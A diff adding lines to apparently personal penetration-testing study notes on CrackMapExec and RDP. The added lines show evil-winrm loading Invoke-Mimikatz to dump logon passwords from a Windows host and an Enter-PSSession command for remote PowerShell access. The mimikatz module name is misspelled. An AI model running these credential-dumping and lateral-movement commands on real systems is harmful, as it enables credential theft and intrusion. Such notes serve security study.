@@ -72,6 +72,22 @@ connect with xfreerdp
 Which one of the following is NOT a CrackMapExec SMB module? > hashcat
 
 Which of the following protocols does CrackMapExec support for lateral movement in Windows environments? > LDAP, winRM, SMB, Kerberos
+
+evil-winrm with Invoke-mimikatz.ps1
+------------------------------------
+Invoke-mimikatz.ps1 is in the scripts directory
+
+#evil-winrm.rb -u administrator -p passowrd1 -i 10.10.55.3 -s /root/Desktop/tools/scripts
+#Invoke-Mimikatz.ps1
+#Invoke-Mimikatz -command 'sekurlse::logonpasswords'
+
+Powershell session via WinRM
+----------------------------
+In order to get powershell session > to activate PSRemoting in target system (C:> Enable PSRemoting)
+
+#pwsh
+#$cred =Get-Credential
+#Enter-PSSession -ComputerName 10.4.22.56 -Authentication Negotiate -Credential $cred
 _______________________________________________________________________________________________________________________________________________________________________
 RDP with .rdg file
 -------------------
